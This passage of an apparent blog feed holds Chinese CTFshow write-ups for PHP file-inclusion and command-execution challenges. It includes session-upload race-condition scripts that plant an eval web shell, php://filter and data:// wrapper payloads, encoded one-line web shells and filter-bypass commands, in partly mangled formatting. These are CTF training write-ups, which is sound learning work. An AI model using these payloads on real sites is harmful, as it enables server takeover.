--"></a>-<em>- coding: utf-8 -</em>-</h1><h1 id="Time-20-12-5-13-52"><a href="#Time-20-12-5-13-52" class="headerlink" title="@Time : 20.12.5 13:52"></a>@Time : 20.12.5 13:52</h1><h1 id="author-lonmar"><a href="#author-lonmar" class="headerlink" title="@author:lonmar"></a>@author:lonmar</h1><p>  import io<br>  import requests<br>  import threading</p><p>  sessid &#x3D; ‘test’<br>  data &#x3D; {<br>      “ctf”: “&#x2F;tmp&#x2F;sess_test”,<br>      “cmd”: ‘system(“cat flag.php”);’<br>  }</p><p>  def write(session):<br>      while event.isSet():<br>          f &#x3D; io.BytesIO(b’a’ * 1024 * 50)<br>          resp &#x3D; session.post(‘<a href="http://b2714a45-4bd4-416b-87cd-98d7f177a2b1.challenge.ctf.show/&#39;">http://b2714a45-4bd4-416b-87cd-98d7f177a2b1.challenge.ctf.show/&#39;</a>,<br>                              data&#x3D;{‘PHP_SESSION_UPLOAD_PROGRESS’: ‘<?php eval($_POST["cmd"]);?>‘},<br>                              files&#x3D;{‘file’: (‘test.txt’, f)}, cookies&#x3D;{‘PHPSESSID’: sessid})</p><p>  def read(session):<br>      while event.isSet():<br>          res &#x3D; session.post(<br>              ‘<a href="http://b2714a45-4bd4-416b-87cd-98d7f177a2b1.challenge.ctf.show/?isVIP=1&#39;">http://b2714a45-4bd4-416b-87cd-98d7f177a2b1.challenge.ctf.show/?isVIP=1&#39;</a>,<br>              data&#x3D;data<br>          )<br>          if ‘flag{‘ in res.text:<br>              print(res.text)<br>              event.clear()<br>          else:<br>              print(‘[*]retrying…’)</p><p>  if <strong>name</strong> &#x3D;&#x3D; “<strong>main</strong>“:<br>      event &#x3D; threading.Event()<br>      event.set()<br>      with requests.session() as session:<br>          for i in range(1, 5):<br>              threading.Thread(target&#x3D;write, args&#x3D;(session,)).start()</p><pre><code class="hljs">      for i in range(1, 5):          threading.Thread(target=read, args=(session,)).start()</code></pre><pre><code class="hljs"></code></pre>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_文件包含</title>
    <link href="/2022/07/13/CTF_show_Web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2022/07/13/CTF_show_Web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFshow-WriteUps"><a href="#CTFshow-WriteUps" class="headerlink" title="CTFshow WriteUps"></a>CTFshow WriteUps</h1><hr><h2 id="WEB入门"><a href="#WEB入门" class="headerlink" title="WEB入门"></a>WEB入门</h2><hr><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><ul><li>&#96;&#96;&#96;shell<br>&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web79</span><br><br>- 题目这次过滤了php<br><br>- base64绕过<br><br>- ```shell<br>  /?file=data:<span class="hljs-comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span><br>  <br>  PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs====&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure></li></ul><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><ul><li><p>题目这次过滤了php和data</p></li><li><p>看了hint说利用日志包含</p></li><li><p>payload</p></li><li><p>&#96;&#96;&#96;<br>&#x2F;?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>- ```shell<br>  #post传命令<br>  a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat fl0g.php&#x27;</span>);<br></code></pre></td></tr></table></figure></li></ul><h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><ul><li>过滤了php data  :</li><li>做法同web80</li></ul><h3 id="web82-86"><a href="#web82-86" class="headerlink" title="web82~86"></a>web82~86</h3><ul><li><p>过滤了php data  :  .</p></li><li><p>那么之前的方法不奏效了</p></li><li><p>想到php中我们唯一能控制的无后缀的就是session文件</p></li><li><p>使用session文件包含</p></li><li><pre><code class="shell">#前置知识php5.4之后php.ini开始有几个默认选项1.session.upload_progress.enabled = on#表示浏览器向服务器上传一个文件时,php将会把此次文件上传的详细信息存到session中2.session.upload_progress.cleanup = on#表示文件上传结束后,php会立即清空对应session文件中的内容3.session.upload_progress.prefix = &quot;upload_progress_&quot;#prefix+name表示为session中的健名4.session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;5.session.use_strict_mode = off#表示我们对cookie中sessionID可控<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>- ```python<br>  import requests<br>  import io<br>  import threading<br>   <br>  <span class="hljs-attribute">url</span>=<span class="hljs-string">&#x27;http://08d4a04e-19b3-4049-8a81-e9c6226eee2f.challenge.ctf.show:8080/&#x27;</span><br>  #设置PHPSESSID的值<br>  <span class="hljs-attribute">sessionid</span>=<span class="hljs-string">&#x27;ctfshow&#x27;</span>     <br>  data=&#123;<span class="hljs-string">&quot;1&quot;</span>:<span class="hljs-string">&quot;file_put_contents(&#x27;/var/www/html/tao.php&#x27;,&#x27;&lt;?php eval(<span class="hljs-variable">$_POST</span>[2]);?&gt;&#x27;);&quot;</span>&#125;<br>   <br>   <br>  #为了进行条件竞争，需要一边写一边读<br>   <br>  #进行上传文件时需要post传递名为PHP_SESSION_UPLOAD_PROGRESS值为一句话木马<br>  def write(session):<br>  fileBytes = io.BytesIO(b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*1024</span><span class="hljs-number">*50</span>)          #生产一个50k的文件<br>  <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>  <span class="hljs-attribute">response</span>=session.post(url,<br>  data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>&#125;,<br>  cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:sessionid&#125;,<br>  files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)&#125;    #设置文件名字和内容<br>  )<br>   <br>   <br>   <br>  #读取session文件，这里文件为/tmp/sess_ctfshow<br>   <br>  def read(session):<br>  <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>  <span class="hljs-attribute">response</span>=session.post(url+&#x27;?file=/tmp/sess_&#x27;+sessionid,data=data)<br>  <span class="hljs-attribute">response2</span>=session.get(url+&#x27;tao.php&#x27;);<br>  <span class="hljs-keyword">if</span> response2.<span class="hljs-attribute">status_code</span>==200:<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;++++++++++++++++++++&#x27;</span>)<br>  <span class="hljs-keyword">else</span>:<br>  <span class="hljs-built_in">print</span>(response2.status_code)<br>   <br>   <br>   <br>  <span class="hljs-keyword">if</span> <span class="hljs-attribute">__name__</span>==&#x27;__main__&#x27;:<br>   <br>  #开启多线程进行竞争<br>  <span class="hljs-attribute">evnet</span>=threading.Event()<br>  with requests.session() as session:<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(20):<br>  threading.Thread(<span class="hljs-attribute">target</span>=write,args=(session,)).start()<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(20):<br>  threading.Thread(<span class="hljs-attribute">target</span>=read,args=(session,)).start()<br>  evnet.<span class="hljs-built_in">set</span>()<br></code></pre></td></tr></table></figure></code></pre></li><li><p>脚本梭哈,访问url&#x2F;tao.php。post传参2&#x3D;system(‘tac fl0g.php’);</p></li><li><p>什么是多线程竞争</p><ul><li>线程是非独立的，同一个进程里线程是数据共享的，当当各个线程访问数据资源时会出现竞争状态即:</li><li>数据几乎同步会被多个线程占用，造成数据混乱，即所谓的线程不安全 。</li><li>这样，因为在执行session_unset()与执行session_destroy()的时候有间隔，他们与include($file)直接也会有间隔，我们其中的一个线程在删除session文件，而另一个线程刚刚又创建了一个session文件，然后前面的线程又开始包含，那么还是能够正常包含。</li><li>怎么解决多线程竞争问题?—锁</li><li>锁的好处: 确保了某段关键代码(共享数据资源)只能由一个线程从头到尾完整地执行能解决多线程资 源竞争下的原子操作问题。</li><li>锁的坏处: 阻止了多线程并发执行，包含锁的某段代码实际上只能以单线程模式执行，效率就大大地下 降了</li><li>锁的致命问题: 死锁</li></ul></li></ul><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><ul><li><p>&#96;&#96;&#96;shell<br>payload:?file&#x3D;%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%31%25%32%45%25%37%30%25%36%38%25%37%30</p><p>&#x2F;&#x2F;即?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php<br>&#x2F;&#x2F;对写的内容进行base64编码。</p><p>post:content&#x3D;aaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B<br>&#x2F;&#x2F;<?php eval($_POST[1]);?><br>&#x2F;&#x2F;这里加上两个a是为两和phpdie组成8个字符进行解码。</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"></span><br><span class="language-xml">- 最后访问1.php、post输入system(&#x27;tac fl0g.php&#x27;);</span><br><span class="language-xml"></span><br><span class="language-xml">### web88</span><br><span class="language-xml"></span><br><span class="language-xml">- 这题没有过滤data</span><br><span class="language-xml"></span><br><span class="language-xml">- 直接data协议</span><br><span class="language-xml"></span><br><span class="language-xml">- ```shell</span><br><span class="language-xml">  payload：</span><br><span class="language-xml">  ?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ21vbmljYSddKTs/Pnh4</span><br><span class="language-xml">  post:monica=system(&#x27;tac f*&#x27;);</span><br><span class="language-xml">   </span><br><span class="language-xml">  //?file=data://text/plain;base64,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;monica&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">xx</span><br><span class="language-xml">  这里在后面添加两个xx是为了不让后面的php代码base64加密之后出现=，有几个=就加几个字符（其实也可以直接将=删除，因为base64在解码的时候会自动删除=）。如果加密后出现出现+就只能换一个php代码。</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><ul><li>没碰过misc</li><li>我跳了</li></ul><h3 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="hljs-variable">$x</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;too young too simple sometimes naive!&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;contents&#x27;</span>];<br><span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="hljs-variable">$contents</span>);<br></code></pre></td></tr></table></figure><ul><li><p>和web87类似，只限制了我们过滤器的选择，base64，rot</p></li><li><p>发现<strong>convert.iconv</strong>依旧可以使用。</p></li><li><pre><code class="hljs">convert.iconv.这个过滤器需要 php 支持 iconv，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。 然而 我们可以留意到 iconv — 字符串按要求的字符编码来转换;;其用法：iconv ( string $in_charset , string $out_charset , string $str ) : string 将字符串 str 从 in_charset 转换编码到 out_charset。 就其功能而论，有点类似于base_convert的功效一样，只不过二者还是有作用的区别，只是都是涉及编码转换的问题而已；（可以类比）；由此记得国赛的一道love_math的题目，有了base_convert之后就可以尽情的转换从而getshell；那么我们就可以借用此过滤器，从而进行编码的转换，写入我们需要的代码，然后转换掉死亡代码，其实本质上来说也是利用了编码的转换；<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>- ```<br>  用usc-<span class="hljs-number">2</span>编码<br>  对目标字符串进行<span class="hljs-number">2</span>位一反转；（因为是二位一反转，所以字符的数目保持在偶数位上）<br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="shell">payload:get: ?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=2.phppost:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;? //ucs大小写都行然后访问2.php post:1=system(&#39;tac f*&#39;);</code></pre></li></ul>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_命令执行</title>
    <link href="/2022/07/12/CTF_show_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2022/07/12/CTF_show_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFshow-WriteUps"><a href="#CTFshow-WriteUps" class="headerlink" title="CTFshow WriteUps"></a>CTFshow WriteUps</h1><hr><h2 id="WEB入门"><a href="#WEB入门" class="headerlink" title="WEB入门"></a>WEB入门</h2><hr><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>过滤了字符串‘flag’</p></li><li><pre><code class="hljs">/?c=system(&quot;tac f*.php&quot;);<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web30</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>  &#125;<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>过滤了system flag php</p></li><li><pre><code class="hljs">/?c=echo `tac f*`;<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web31</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>过滤了flag system php cat sort shell  . 空格 ‘ </p></li><li><pre><code class="shell">/?c=echo`tac%09f*`;#也就是吧web30的空格用%09替换<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web32</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>又多过滤了echo，之前的echo走不通了</p></li><li><pre><code class="shell">/?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php；#解释：#php://filter是一个过滤器，这里通过指定base64编码的一个过滤器来读取flag.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- 对得到内容进行base64解码看到flag<br><br><span class="hljs-comment">### web33~36同web32</span><br><br><span class="hljs-comment">### web37</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>  &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="shell">/?c=data://text/plain,&lt;?php system(&quot;tac f*&quot;);?&gt;#用data伪协议,主要用于数据流的读取，传入的数据是php代码就会执行#嵌入文本data://text/plain#data://类似php://input，可用来控制输入流，与包含函数结合时，输入的data://流会被当成php文件执行。此题就与include()函数相结合，直接输命令。过滤了字符串flag，看源代码。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web38</span><br><br>```php<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|php|file/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>  &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>在web37的基础上又过滤了php</p></li><li><p>将执行的代码换成短标签形式<?=?></p></li><li><pre><code class="shell">/?c=data://text/plain,&lt;?= system(&quot;tac f*&quot;);?&gt;<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web39</span><br><br>```php<br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<span class="hljs-comment">#把c和.php拼接起来了</span><br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>因为在短标签里面进行了一个?&gt;标签闭合了，所以不会受到php的影响</p></li><li><pre><code class="shell">/?c=data://text/plain,&lt;?= system(&quot;tac f*&quot;);?&gt;<figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs r"><br><span class="hljs-comment">### web40</span><br><br>```php<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>eval语句执行命令，但过滤了很多东西</p></li><li><p>注意没有过滤掉英文的()</p></li><li><p>&#96;&#96;&#96;shell<br>&#x2F;?c&#x3D;print_r(scandir(reset(localeconv())));<br>#解释：<br>#因为英文的括号没有过滤，所以想到函数传参数</p></li></ul><h1 id="localeconv-返回一包含本地数字及本地货币信息的数组"><a href="#localeconv-返回一包含本地数字及本地货币信息的数组" class="headerlink" title="localeconv() 返回一包含本地数字及本地货币信息的数组"></a>localeconv() 返回一包含本地数字及本地货币信息的数组</h1><h1 id="reset-返回数组第一个单元的值，如果数组为空则返回false"><a href="#reset-返回数组第一个单元的值，如果数组为空则返回false" class="headerlink" title="reset() 返回数组第一个单元的值，如果数组为空则返回false"></a>reset() 